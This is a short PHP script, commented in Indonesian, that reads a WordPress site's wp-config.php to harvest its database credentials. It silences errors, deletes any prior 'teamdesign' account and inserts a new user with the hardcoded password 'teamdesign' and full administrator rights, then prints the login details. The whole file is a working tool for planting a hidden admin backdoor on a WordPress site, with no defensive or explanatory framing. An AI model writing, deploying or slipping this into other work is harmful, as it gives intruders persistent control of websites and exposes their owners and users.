<?php
// Matikan error reporting untuk sementara
error_reporting(0);

// Baca file wp-config.php
$wp_config = file_get_contents('wp-config.php');

// Extract database credentials
preg_match("/define\(\s*'DB_NAME',\s*'(.*?)'\s*\)/", $wp_config, $db_name);
preg_match("/define\(\s*'DB_USER',\s*'(.*?)'\s*\)/", $wp_config, $db_user);
preg_match("/define\(\s*'DB_PASSWORD',\s*'(.*?)'\s*\)/", $wp_config, $db_pass);
preg_match("/define\(\s*'DB_HOST',\s*'(.*?)'\s*\)/", $wp_config, $db_host);
preg_match("/\$table_prefix\s*=\s*'(.*?)'/", $wp_config, $table_prefix);

// Koneksi database
$conn = new mysqli($db_host[1], $db_user[1], $db_pass[1], $db_name[1]);

if ($conn->connect_error) {
    die("Koneksi gagal: " . $conn->connect_error);
}

$prefix = $table_prefix[1];
$username = 'teamdesign';
$password = 'teamdesign';
$email = 'teamdesign@teamdesign.com';

// Hapus user lama jika ada
$conn->query("DELETE FROM {$prefix}users WHERE user_login='teamdesign'");
$conn->query("DELETE FROM {$prefix}usermeta WHERE user_id NOT IN (SELECT ID FROM {$prefix}users)");

// Insert user baru
$hashed = password_hash($password, PASSWORD_BCRYPT);
$conn->query("INSERT INTO {$prefix}users (user_login, user_pass, user_email, user_registered) 
              VALUES ('$username', '$hashed', '$email', NOW())");

$user_id = $conn->insert_id;

// Set sebagai admin
$conn->query("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES 
             ($user_id, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}'),
             ($user_id, '{$prefix}user_level', '10')");

if($user_id) {
    echo "SUKSES! User teamdesign (admin) telah ditambahkan.<br>";
    echo "Username: teamdesign<br>";
    echo "Password: teamdesign<br>";
    echo "Email: teamdesign@teamdesign.com";
} else {
    echo "Gagal: " . $conn->error;
}

$conn->close();
?>
